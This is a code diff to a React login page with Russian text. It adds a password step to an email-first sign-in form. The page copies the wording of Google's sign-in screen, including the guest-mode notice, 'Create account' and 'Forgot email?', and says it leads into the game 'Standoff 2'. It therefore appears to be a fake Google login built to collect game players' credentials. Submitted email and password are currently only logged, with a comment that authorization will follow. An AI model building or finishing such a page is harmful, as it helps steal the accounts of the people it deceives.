@@ -5,10 +5,19 @@ import Logo from "@/components/Logo";
 
 const Login = () => {
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [step, setStep] = useState<"email" | "password">("email");
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    console.log("Email submitted:", email);
+    if (step === "email") {
+      if (email) {
+        setStep("password");
+      }
+    } else {
+      console.log("Login submitted:", { email, password });
+      // Здесь будет логика авторизации
+    }
   };
 
   return (
@@ -24,49 +33,109 @@ const Login = () => {
         <div className="w-full max-w-md">
           <h1 className="text-5xl font-normal text-foreground mb-6">Вход</h1>
           
-          <p className="text-foreground mb-10">
-            Переход в приложение "<span className="text-primary">Standoff 2</span>"
-          </p>
+          {step === "email" ? (
+            <>
+              <p className="text-foreground mb-10">
+                Переход в приложение "<span className="text-primary">Standoff 2</span>"
+              </p>
 
-          <form onSubmit={handleSubmit} className="space-y-6">
-            <div>
-              <Input
-                type="text"
-                placeholder="Телефон или адрес эл. почты"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
-              />
-            </div>
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div>
+                  <Input
+                    type="text"
+                    placeholder="Телефон или адрес эл. почты"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                  />
+                </div>
 
-            <a href="#" className="text-primary text-sm hover:underline inline-block">
-              Забыли адрес электронной почты?
-            </a>
+                <a href="#" className="text-primary text-sm hover:underline inline-block">
+                  Забыли адрес электронной почты?
+                </a>
 
-            <p className="text-muted-foreground text-sm leading-relaxed">
-              Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
-              <a href="#" className="text-primary hover:underline">
-                Подробнее о гостевом режиме
-              </a>
-            </p>
+                <p className="text-muted-foreground text-sm leading-relaxed">
+                  Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
+                  <a href="#" className="text-primary hover:underline">
+                    Подробнее о гостевом режиме
+                  </a>
+                </p>
 
-            <div className="flex justify-between items-center pt-8">
-              <Button
-                type="button"
-                variant="ghost"
-                className="text-primary hover:bg-secondary hover:text-primary"
-              >
-                Создать аккаунт
-              </Button>
-              
-              <Button
-                type="submit"
-                className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
-              >
-                Далее
-              </Button>
-            </div>
-          </form>
+                <div className="flex justify-between items-center pt-8">
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    className="text-primary hover:bg-secondary hover:text-primary"
+                  >
+                    Создать аккаунт
+                  </Button>
+                  
+                  <Button
+                    type="submit"
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                  >
+                    Далее
+                  </Button>
+                </div>
+              </form>
+            </>
+          ) : (
+            <>
+              <div className="flex items-center gap-3 mb-10 p-4 border border-border rounded-lg">
+                <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-semibold">
+                  {email[0]?.toUpperCase()}
+                </div>
+                <div>
+                  <div className="text-foreground">{email}</div>
+                  <button
+                    type="button"
+                    onClick={() => setStep("email")}
+                    className="text-primary text-sm hover:underline"
+                  >
+                    Сменить аккаунт
+                  </button>
+                </div>
+              </div>
+
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div>
+                  <Input
+                    type="password"
+                    placeholder="Введите пароль"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                  />
+                </div>
+
+                <a href="#" className="text-primary text-sm hover:underline inline-block">
+                  Забыли пароль?
+                </a>
+
+                <p className="text-muted-foreground text-sm leading-relaxed">
+                  Чтобы защитить ваш аккаунт, убедитесь, что это действительно вы пытаетесь войти.
+                </p>
+
+                <div className="flex justify-between items-center pt-8">
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    onClick={() => setStep("email")}
+                    className="text-primary hover:bg-secondary hover:text-primary"
+                  >
+                    Назад
+                  </Button>
+                  
+                  <Button
+                    type="submit"
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                  >
+                    Далее
+                  </Button>
+                </div>
+              </form>
+            </>
+          )}
         </div>
       </main>
 
